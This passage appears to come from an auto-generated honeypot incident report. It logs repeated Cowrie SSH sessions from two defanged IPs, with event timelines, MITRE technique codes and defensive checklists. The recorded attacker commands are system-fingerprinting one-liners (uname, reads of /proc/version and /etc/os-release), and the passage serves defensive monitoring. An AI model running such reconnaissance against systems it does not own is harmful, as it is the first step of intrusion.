| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:09:50` | `cowrie.session.connect` |
| `2026-07-19 05:09:58` | `cowrie.client.version` |
| `2026-07-19 05:09:58` | `cowrie.client.kex` |
| `2026-07-19 05:10:35` | `cowrie.login.success` |
| `2026-07-19 05:11:01` | `cowrie.session.params` |
| `2026-07-19 05:11:01` | `cowrie.command.input` |
| `2026-07-19 05:11:12` | `cowrie.log.closed` |
| `2026-07-19 05:11:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2427971c7ad6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:09 |
| **Last Seen** | 2026-07-19 05:11 |
| **Session Duration** | 88s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:09:57` | `cowrie.session.connect` |
| `2026-07-19 05:10:09` | `cowrie.client.version` |
| `2026-07-19 05:10:09` | `cowrie.client.kex` |
| `2026-07-19 05:10:49` | `cowrie.login.success` |
| `2026-07-19 05:11:10` | `cowrie.session.params` |
| `2026-07-19 05:11:10` | `cowrie.command.input` |
| `2026-07-19 05:11:26` | `cowrie.log.closed` |
| `2026-07-19 05:11:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7b95b1e18da

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:10 |
| **Last Seen** | 2026-07-19 05:11 |
| **Session Duration** | 87s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:10:21` | `cowrie.session.connect` |
| `2026-07-19 05:10:29` | `cowrie.client.version` |
| `2026-07-19 05:10:29` | `cowrie.client.kex` |
| `2026-07-19 05:11:15` | `cowrie.login.success` |
| `2026-07-19 05:11:41` | `cowrie.session.params` |
| `2026-07-19 05:11:41` | `cowrie.command.input` |
| `2026-07-19 05:11:49` | `cowrie.log.closed` |
| `2026-07-19 05:11:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63e07e864a53

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:10 |
| **Last Seen** | 2026-07-19 05:11 |
| **Session Duration** | 85s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:10:29` | `cowrie.session.connect` |
| `2026-07-19 05:10:41` | `cowrie.client.version` |
| `2026-07-19 05:10:41` | `cowrie.client.kex` |
| `2026-07-19 05:11:30` | `cowrie.login.success` |
| `2026-07-19 05:11:49` | `cowrie.session.params` |
| `2026-07-19 05:11:49` | `cowrie.command.input` |
| `2026-07-19 05:11:55` | `cowrie.log.closed` |
| `2026-07-19 05:11:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbb25b907661

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:10 |
| **Last Seen** | 2026-07-19 05:12 |
| **Session Duration** | 84s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:10:36` | `cowrie.session.connect` |
| `2026-07-19 05:10:50` | `cowrie.client.version` |
| `2026-07-19 05:10:50` | `cowrie.client.kex` |
| `2026-07-19 05:11:38` | `cowrie.login.success` |
| `2026-07-19 05:11:52` | `cowrie.session.params` |
| `2026-07-19 05:11:52` | `cowrie.command.input` |
| `2026-07-19 05:12:00` | `cowrie.log.closed` |
| `2026-07-19 05:12:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a09d685975c5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:10 |
| **Last Seen** | 2026-07-19 05:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:10:55` | `cowrie.session.connect` |
| `2026-07-19 05:10:55` | `cowrie.client.version` |
| `2026-07-19 05:10:55` | `cowrie.client.kex` |
| `2026-07-19 05:10:57` | `cowrie.login.success` |
| `2026-07-19 05:10:58` | `cowrie.session.params` |
| `2026-07-19 05:10:58` | `cowrie.command.input` |
| `2026-07-19 05:10:58` | `cowrie.command.input` |
| `2026-07-19 05:10:58` | `cowrie.command.input` |
| `2026-07-19 05:10:58` | `cowrie.command.input` |
| `2026-07-19 05:10:58` | `cowrie.command.input` |
| `2026-07-19 05:10:58` | `cowrie.command.success` |
| `2026-07-19 05:10:58` | `cowrie.command.input` |
| `2026-07-19 05:10:58` | `cowrie.command.input` |
| `2026-07-19 05:10:58` | `cowrie.command.input` |
| `2026-07-19 05:10:58` | `cowrie.command.input` |
| `2026-07-19 05:10:59` | `cowrie.log.closed` |
| `2026-07-19 05:10:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e79041a7d132

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:11 |
| **Last Seen** | 2026-07-19 05:12 |
| **Session Duration** | 75s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:11:01` | `cowrie.session.connect` |
| `2026-07-19 05:11:11` | `cowrie.client.version` |
| `2026-07-19 05:11:11` | `cowrie.client.kex` |
| `2026-07-19 05:11:52` | `cowrie.login.success` |
| `2026-07-19 05:12:09` | `cowrie.session.params` |
| `2026-07-19 05:12:09` | `cowrie.command.input` |
| `2026-07-19 05:12:16` | `cowrie.log.closed` |
| `2026-07-19 05:12:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-100db1ce738f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:11 |
| **Last Seen** | 2026-07-19 05:12 |
| **Session Duration** | 73s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:11:08` | `cowrie.session.connect` |
| `2026-07-19 05:11:23` | `cowrie.client.version` |
| `2026-07-19 05:11:23` | `cowrie.client.kex` |
| `2026-07-19 05:11:57` | `cowrie.login.success` |
| `2026-07-19 05:12:15` | `cowrie.session.params` |
| `2026-07-19 05:12:15` | `cowrie.command.input` |
| `2026-07-19 05:12:22` | `cowrie.log.closed` |
| `2026-07-19 05:12:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ada838fe58ac

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:11 |
| **Last Seen** | 2026-07-19 05:12 |
| **Session Duration** | 68s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:11:31` | `cowrie.session.connect` |
| `2026-07-19 05:11:41` | `cowrie.client.version` |
| `2026-07-19 05:11:41` | `cowrie.client.kex` |
| `2026-07-19 05:12:12` | `cowrie.login.success` |
| `2026-07-19 05:12:27` | `cowrie.session.params` |
| `2026-07-19 05:12:27` | `cowrie.command.input` |
| `2026-07-19 05:12:39` | `cowrie.log.closed` |
| `2026-07-19 05:12:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99491860b592

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:11 |
| **Last Seen** | 2026-07-19 05:13 |
| **Session Duration** | 71s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:11:50` | `cowrie.session.connect` |
| `2026-07-19 05:11:56` | `cowrie.client.version` |
| `2026-07-19 05:11:56` | `cowrie.client.kex` |
| `2026-07-19 05:12:28` | `cowrie.login.success` |
| `2026-07-19 05:12:52` | `cowrie.session.params` |
| `2026-07-19 05:12:52` | `cowrie.command.input` |
| `2026-07-19 05:13:02` | `cowrie.log.closed` |
| `2026-07-19 05:13:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebc0dba1b7a1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:12 |
| **Last Seen** | 2026-07-19 05:13 |
| **Session Duration** | 75s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:12:09` | `cowrie.session.connect` |
| `2026-07-19 05:12:15` | `cowrie.client.version` |
| `2026-07-19 05:12:15` | `cowrie.client.kex` |
| `2026-07-19 05:12:54` | `cowrie.login.success` |
| `2026-07-19 05:13:16` | `cowrie.session.params` |
| `2026-07-19 05:13:16` | `cowrie.command.input` |
| `2026-07-19 05:13:24` | `cowrie.log.closed` |
| `2026-07-19 05:13:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36d536dd3d03

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:12 |
| **Last Seen** | 2026-07-19 05:13 |
| **Session Duration** | 80s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:12:17` | `cowrie.session.connect` |
| `2026-07-19 05:12:24` | `cowrie.client.version` |
| `2026-07-19 05:12:24` | `cowrie.client.kex` |
| `2026-07-19 05:13:07` | `cowrie.login.success` |
| `2026-07-19 05:13:27` | `cowrie.session.params` |
| `2026-07-19 05:13:27` | `cowrie.command.input` |
| `2026-07-19 05:13:37` | `cowrie.log.closed` |
| `2026-07-19 05:13:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd2c53bcd2b7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:12 |
| **Last Seen** | 2026-07-19 05:13 |
| **Session Duration** | 89s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:12:25` | `cowrie.session.connect` |
| `2026-07-19 05:12:37` | `cowrie.client.version` |
| `2026-07-19 05:12:37` | `cowrie.client.kex` |
| `2026-07-19 05:13:17` | `cowrie.login.success` |
| `2026-07-19 05:13:37` | `cowrie.session.params` |
| `2026-07-19 05:13:37` | `cowrie.command.input` |
| `2026-07-19 05:13:54` | `cowrie.log.closed` |
| `2026-07-19 05:13:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-219b33b679ad

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:12 |
| **Last Seen** | 2026-07-19 05:14 |
| **Session Duration** | 93s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:12:31` | `cowrie.session.connect` |
| `2026-07-19 05:12:44` | `cowrie.client.version` |
| `2026-07-19 05:12:44` | `cowrie.client.kex` |
| `2026-07-19 05:13:24` | `cowrie.login.success` |
| `2026-07-19 05:13:51` | `cowrie.session.params` |
| `2026-07-19 05:13:51` | `cowrie.command.input` |
| `2026-07-19 05:14:04` | `cowrie.log.closed` |
| `2026-07-19 05:14:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55b527bc5cec

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:12 |
| **Last Seen** | 2026-07-19 05:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:12:49` | `cowrie.session.connect` |
| `2026-07-19 05:12:49` | `cowrie.client.version` |
| `2026-07-19 05:12:49` | `cowrie.client.kex` |
| `2026-07-19 05:12:51` | `cowrie.login.success` |
| `2026-07-19 05:12:52` | `cowrie.session.params` |
| `2026-07-19 05:12:52` | `cowrie.command.input` |
| `2026-07-19 05:12:52` | `cowrie.command.input` |
| `2026-07-19 05:12:52` | `cowrie.command.input` |
| `2026-07-19 05:12:52` | `cowrie.command.input` |
| `2026-07-19 05:12:52` | `cowrie.command.input` |
| `2026-07-19 05:12:52` | `cowrie.command.success` |
| `2026-07-19 05:12:52` | `cowrie.command.input` |
| `2026-07-19 05:12:52` | `cowrie.command.input` |
| `2026-07-19 05:12:52` | `cowrie.command.input` |
| `2026-07-19 05:12:52` | `cowrie.command.input` |
| `2026-07-19 05:12:53` | `cowrie.log.closed` |
| `2026-07-19 05:12:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab208c1c2bc6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:12 |
| **Last Seen** | 2026-07-19 05:14 |
| **Session Duration** | 88s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:12:55` | `cowrie.session.connect` |
| `2026-07-19 05:13:05` | `cowrie.client.version` |
| `2026-07-19 05:13:05` | `cowrie.client.kex` |
| `2026-07-19 05:13:50` | `cowrie.login.success` |
| `2026-07-19 05:14:16` | `cowrie.session.params` |
| `2026-07-19 05:14:16` | `cowrie.command.input` |
| `2026-07-19 05:14:23` | `cowrie.log.closed` |
| `2026-07-19 05:14:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4ef00622d27

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:13 |
| **Last Seen** | 2026-07-19 05:14 |
| **Session Duration** | 75s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:13:16` | `cowrie.session.connect` |
| `2026-07-19 05:13:25` | `cowrie.client.version` |
| `2026-07-19 05:13:25` | `cowrie.client.kex` |
| `2026-07-19 05:14:16` | `cowrie.login.success` |
| `2026-07-19 05:14:28` | `cowrie.session.params` |
| `2026-07-19 05:14:28` | `cowrie.command.input` |
| `2026-07-19 05:14:32` | `cowrie.log.closed` |
| `2026-07-19 05:14:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cad3465c65c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:13 |
| **Last Seen** | 2026-07-19 05:14 |
| **Session Duration** | 71s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:13:23` | `cowrie.session.connect` |
| `2026-07-19 05:13:33` | `cowrie.client.version` |
| `2026-07-19 05:13:33` | `cowrie.client.kex` |
| `2026-07-19 05:14:22` | `cowrie.login.success` |
| `2026-07-19 05:14:31` | `cowrie.session.params` |
| `2026-07-19 05:14:31` | `cowrie.command.input` |
| `2026-07-19 05:14:35` | `cowrie.log.closed` |
| `2026-07-19 05:14:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92b4ea960a2f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:13 |
| **Last Seen** | 2026-07-19 05:14 |
| **Session Duration** | 68s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:13:31` | `cowrie.session.connect` |
| `2026-07-19 05:13:41` | `cowrie.client.version` |
| `2026-07-19 05:13:41` | `cowrie.client.kex` |
| `2026-07-19 05:14:27` | `cowrie.login.success` |
| `2026-07-19 05:14:34` | `cowrie.session.params` |
| `2026-07-19 05:14:34` | `cowrie.command.input` |
| `2026-07-19 05:14:39` | `cowrie.log.closed` |
| `2026-07-19 05:14:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de5bc873449f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:13 |
| **Last Seen** | 2026-07-19 05:14 |
| **Session Duration** | 55s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:13:55` | `cowrie.session.connect` |
| `2026-07-19 05:14:08` | `cowrie.client.version` |
| `2026-07-19 05:14:08` | `cowrie.client.kex` |
| `2026-07-19 05:14:32` | `cowrie.login.success` |
| `2026-07-19 05:14:44` | `cowrie.session.params` |
| `2026-07-19 05:14:44` | `cowrie.command.input` |
| `2026-07-19 05:14:50` | `cowrie.log.closed` |
| `2026-07-19 05:14:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a84f7bf4853f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:14 |
| **Last Seen** | 2026-07-19 05:15 |
| **Session Duration** | 39s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:14:30` | `cowrie.session.connect` |
| `2026-07-19 05:14:33` | `cowrie.client.version` |
| `2026-07-19 05:14:33` | `cowrie.client.kex` |
| `2026-07-19 05:14:57` | `cowrie.login.success` |
| `2026-07-19 05:15:05` | `cowrie.session.params` |
| `2026-07-19 05:15:05` | `cowrie.command.input` |
| `2026-07-19 05:15:09` | `cowrie.log.closed` |
| `2026-07-19 05:15:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6eabb6d4c338

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:14 |
| **Last Seen** | 2026-07-19 05:15 |
| **Session Duration** | 40s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:14:36` | `cowrie.session.connect` |
| `2026-07-19 05:14:44` | `cowrie.client.version` |
| `2026-07-19 05:14:44` | `cowrie.client.kex` |
| `2026-07-19 05:15:04` | `cowrie.login.success` |
| `2026-07-19 05:15:12` | `cowrie.session.params` |
| `2026-07-19 05:15:12` | `cowrie.command.input` |
| `2026-07-19 05:15:16` | `cowrie.log.closed` |
| `2026-07-19 05:15:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-142e6696174d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:14 |
| **Last Seen** | 2026-07-19 05:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:14:39` | `cowrie.session.connect` |
| `2026-07-19 05:14:39` | `cowrie.client.version` |
| `2026-07-19 05:14:39` | `cowrie.client.kex` |
| `2026-07-19 05:14:41` | `cowrie.login.success` |
| `2026-07-19 05:14:42` | `cowrie.session.params` |
| `2026-07-19 05:14:42` | `cowrie.command.input` |
| `2026-07-19 05:14:42` | `cowrie.command.input` |
| `2026-07-19 05:14:42` | `cowrie.command.input` |
| `2026-07-19 05:14:42` | `cowrie.command.input` |
| `2026-07-19 05:14:42` | `cowrie.command.input` |
| `2026-07-19 05:14:42` | `cowrie.command.success` |
| `2026-07-19 05:14:42` | `cowrie.command.input` |
